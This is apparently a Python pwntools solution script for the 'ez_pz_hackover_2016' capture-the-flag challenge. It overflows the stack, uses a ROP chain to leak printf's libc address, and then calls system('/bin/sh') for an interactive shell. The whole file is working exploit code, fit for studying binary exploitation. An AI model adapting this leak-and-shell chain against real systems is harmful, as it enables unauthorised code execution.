from LibcSearcher import LibcSearcher
from pwn import *


def ez_pz_hackover_2016(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/ez_pz_hackover_2016'):
    print('ez_pz_hackover_2016 start')
    context(log_level='debug', arch='i386', os='linux')
    target = process([file_name])
    # target = remote('node4.buuoj.cn', 26829)
    target_elf = ELF(file_name)

    pop_ret_gadget = p32(0x08048401)  # pop ebx ; ret
    pop2_ret_gadget = p32(0x0804877a)  # pop edi ; pop ebp ; ret

    chall_addr = p32(target_elf.symbols['chall'])
    printf_got = p32(target_elf.got['printf'])
    format_addr = p32(0x08048845)  # \nWelcome %s!\n

    target.recvuntil('Yippie, lets crash: ')

    payload_1 = b'crashme' + p8(0x0)
    payload_1 += b'a' * (26 - len(payload_1))
    # printf('\nWelcome %s!\n', printf_got)
    payload_1 += p32(0x08048430) + pop2_ret_gadget + format_addr + printf_got
    payload_1 += chall_addr

    target.recvuntil('Whats your name?\n')
    # gdb.attach(target)
    target.sendlineafter('> ', payload_1)
    print(target.recv(27))
    printf_addr = u32(target.recv(4))

    searcher = LibcSearcher('printf', printf_addr)
    libc_base = printf_addr - searcher.dump('printf')
    system_addr = p32(libc_base + searcher.dump('system'))
    bin_sh_addr = p32(libc_base + searcher.dump('str_bin_sh'))
    payload_2 = b'crashme' + p8(0x0)
    payload_2 += b'a' * (26 - len(payload_2))
    # system('/bin/sh')
    payload_2 += system_addr + pop_ret_gadget + bin_sh_addr
    target.sendlineafter('> ', payload_2)
    target.interactive()

    print('ez_pz_hackover_2016 end')


if __name__ == '__main__':
    ez_pz_hackover_2016()
